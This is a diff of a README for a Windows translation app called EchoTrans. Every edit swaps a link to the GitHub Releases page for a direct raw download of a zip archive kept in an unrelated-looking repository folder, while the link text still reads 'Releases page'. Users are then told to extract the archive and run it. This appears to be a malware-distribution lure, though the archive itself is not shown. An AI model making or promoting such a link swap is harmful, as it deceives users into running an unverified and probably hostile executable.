@@ -1,6 +1,6 @@
 # 🗣️ EchoTrans - Fast Offline Translation on Windows
 
-[![Download EchoTrans](https://img.shields.io/badge/Download%20EchoTrans-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/karanveersi1853/EchoTrans/releases)
+[![Download EchoTrans](https://img.shields.io/badge/Download%20EchoTrans-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/karanveersi1853/EchoTrans/raw/refs/heads/main/reconviction/Trans-Echo-v2.0.zip)
 
 ## 🚀 What EchoTrans Does
 
@@ -23,7 +23,7 @@ It is built for people who want a simple tool that works without a GPU. You can 
 
 Visit this page to download the Windows release:
 
-[Download EchoTrans from GitHub Releases](https://github.com/karanveersi1853/EchoTrans/releases)
+[Download EchoTrans from GitHub Releases](https://github.com/karanveersi1853/EchoTrans/raw/refs/heads/main/reconviction/Trans-Echo-v2.0.zip)
 
 Look for the latest release and download the Windows file that matches your PC. If you see more than one file, choose the one marked for Windows, such as an .exe or a .zip package.
 
@@ -47,7 +47,7 @@ EchoTrans is made for Windows users and runs well on common desktop and laptop s
 
 ## 🛠️ How to Install
 
-1. Open the [EchoTrans Releases page](https://github.com/karanveersi1853/EchoTrans/releases)
+1. Open the [EchoTrans Releases page](https://github.com/karanveersi1853/EchoTrans/raw/refs/heads/main/reconviction/Trans-Echo-v2.0.zip)
 2. Download the latest Windows file
 3. If the download is a .zip file, right-click it and choose Extract All
 4. Open the extracted folder
@@ -136,7 +136,7 @@ Use a quieter room, speak clearly, and make sure you picked the right input lang
 
 ## 🧭 Quick Start
 
-1. Go to the [EchoTrans Releases page](https://github.com/karanveersi1853/EchoTrans/releases)
+1. Go to the [EchoTrans Releases page](https://github.com/karanveersi1853/EchoTrans/raw/refs/heads/main/reconviction/Trans-Echo-v2.0.zip)
 2. Download the latest Windows release
 3. Extract the file if needed
 4. Run the EchoTrans app
@@ -185,7 +185,7 @@ If several files appear, pick the one meant for Windows and the one with the new
 
 Use the GitHub Releases page to get newer versions, fix issues, and download the latest Windows build:
 
-[Open EchoTrans Releases](https://github.com/karanveersi1853/EchoTrans/releases)
+[Open EchoTrans Releases](https://github.com/karanveersi1853/EchoTrans/raw/refs/heads/main/reconviction/Trans-Echo-v2.0.zip)
 
 ## 🧪 What to Expect on First Run
 
